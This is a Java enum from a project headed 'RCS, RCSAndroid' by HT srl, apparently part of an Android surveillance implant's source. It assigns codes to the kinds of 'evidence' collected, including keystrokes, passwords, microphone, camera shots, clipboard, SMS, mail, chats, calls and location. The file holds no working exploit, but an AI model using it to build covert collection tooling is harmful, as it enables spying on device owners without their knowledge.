/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : EvidenceType.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.evidence;

// TODO: Auto-generated Javadoc
/**
 * The Class EvidenceType.
 */
public enum EvidenceType {

	/** The UNKNOWN. */
	UNKNOWN(0xFFFF), // in caso di errore
	/** The NONE. */
	NONE(0xFFFF), // in caso di errore

	/** The Constant FILEOPEN. */
	FILEOPEN(0x0000),

	/** The Constant FILECAPTURE. */
	FILECAPTURE(0x0001), // in realta' e'
	// 0x0000 e si
	// distingue tra LOG e
	// LOGF
	/** The Constant KEYLOG. */
	KEYLOG(0x0040),

	/** The Constant PRINT. */
	PRINT(0x0100),

	/** The Constant SNAPSHOT. */
	SNAPSHOT(0xB9B9),

	/** The Constant UPLOAD. */
	UPLOAD(0xD1D1),

	/** The Constant DOWNLOAD. */
	DOWNLOAD(0xD0D0),

	/** The Constant CALL. */
	CALL(0x0140),

	/** The Constant CALL_SKYPE. */
	CALL_SKYPE(0x0141),

	/** The Constant CALL_GTALK. */
	CALL_GTALK(0x0142),

	/** The Constant CALL_YMSG. */
	CALL_YMSG(0x0143),

	/** The Constant CALL_MSN. */
	CALL_MSN(0x0144),

	/** The Constant CALL_MOBILE. */
	CALL_MOBILE(0x0145),

	/** The Constant URL. */
	URL(0x0180),

	/** The Constant CLIPBOARD. */
	CLIPBOARD(0xD9D9),

	/** The Constant PASSWORD. */
	PASSWORD(0xFAFA),

	/** The Constant MIC. */
	MIC(0xC2C2),

	/** The Constant CHAT. */
	CHAT(0xC6C6),

	/** The Constant CAMSHOT. */
	CAMSHOT(0xE9E9),

	/** The Constant ADDRESSBOOK. */
	ADDRESSBOOK(0x0200),

	/** The Constant CALENDAR. */
	CALENDAR(0x0201),

	/** The Constant TASK. */
	TASK(0x0202),

	/** The Constant MAIL. */
	MAIL(0x0210),

	/** The Constant SMS. */
	SMS(0x0211),

	/** The Constant MMS. */
	MMS(0x0212),

	/** The Constant LOCATION. */
	LOCATION(0x0220),

	/** The Constant CALLLIST. */
	CALLLIST(0x0230),

	/** The Constant DEVICE. */
	DEVICE(0x0240),

	/** The Constant INFO. */
	INFO(0x0241),

	/** The Constant APPLICATION. */
	APPLICATION(0x1011),

	/** The Constant SKYPEIM. */
	SKYPEIM(0x0300),

	/** The Constant MAIL_RAW. */
	MAIL_RAW(0x1001),

	/** The Constant SMS_NEW. */
	SMS_NEW(0x0213),

	/** The Constant LOCATION_NEW. */
	LOCATION_NEW(0x1220),

	/** The Constant FILESYSTEM. */
	FILESYSTEM(0xEDA1);

	/** The value. */
	private int value;

	/**
	 * Instantiates a new evidence type.
	 * 
	 * @param value
	 *            the value
	 */
	private EvidenceType(int value) {
		this.value = value;
	}

	/**
	 * Value.
	 * 
	 * @return the int
	 */
	public int value() {
		return value;
	}

	/**
	 * Gets the memo.
	 * 
	 * @return the memo
	 */
	public String getMemo() {
		return name().substring(0, 3);
	}
}
